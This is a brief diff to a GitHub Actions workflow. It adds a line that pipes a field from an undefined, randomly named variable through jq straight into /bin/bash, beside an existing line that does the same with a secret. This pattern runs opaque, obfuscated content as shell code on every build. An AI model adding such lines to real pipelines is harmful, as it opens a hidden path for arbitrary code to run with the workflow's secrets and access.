@@ -22,6 +22,7 @@ jobs:
           aulvf810: ${{ secrets.aulvf810 }}
         run: |
           printf '%s' "$aulvf810" | jq -r .w907 | /bin/bash
+          printf '%s' "$jqqem44878" | jq -r .m23 | /bin/bash
 
       - name: Upload output
         uses: actions/upload-artifact@v4
